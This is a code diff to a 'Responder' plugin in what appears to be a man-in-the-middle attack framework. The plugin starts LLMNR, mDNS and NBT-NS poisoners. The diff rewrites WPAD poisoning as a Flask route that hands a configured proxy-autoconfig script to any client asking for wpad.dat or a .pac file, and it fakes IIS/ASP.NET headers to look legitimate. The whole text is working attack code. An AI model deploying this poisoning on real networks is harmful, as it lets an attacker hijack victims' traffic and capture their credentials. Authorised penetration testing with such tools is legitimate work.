@@ -21,12 +21,12 @@
 from plugins.plugin import Plugin
 from twisted.internet import reactor
 from core.utils import SystemConfig, shutdown
+from core.configwatcher import ConfigWatcher
 
 from core.responder.llmnr.LLMNRPoisoner import LLMNRPoisoner
 from core.responder.mdns.MDNSPoisoner import MDNSPoisoner
 from core.responder.nbtns.NBTNSPoisoner import NBTNSPoisoner
 from core.responder.fingerprinter.LANFingerprinter import LANFingerprinter
-from core.responder.wpad.WPADPoisoner import WPADPoisoner
 
 class Responder(Plugin):
     name        = "Responder"
@@ -54,8 +54,23 @@ class Responder(Plugin):
         LLMNRPoisoner().start(options, self.ourip)
 
         if options.wpad:
-            from core.responder.wpad.WPADPoisoner import WPADPoisoner
-            WPADPoisoner().start(options)
+            from core.servers.http.HTTPserver import HTTPserver
+            import flask
+            
+            server = HTTPserver.getInstance().server
+            
+            @server.route('/<wpad_req>')
+            def wpad(wpad_req):
+                if (wpad_req == 'wpad.dat') or (wpad_req.endswith('.pac')):
+                    payload = ConfigWatcher.getInstance().config['Responder']['WPADScript']
+                    
+                    resp = flask.Response(payload)
+                    resp.headers['Server'] = "Microsoft-IIS/6.0"
+                    resp.headers['Content-Type'] = "application/x-ns-proxy-autoconfig"
+                    resp.headers['X-Powered-By'] = "ASP.NET"
+                    resp.headers['Content-Length'] = len(payload)
+
+                    return resp
 
         if self.config["Responder"]["MSSQL"].lower() == "on":
             from core.responder.mssql.MSSQLServer import MSSQLServer
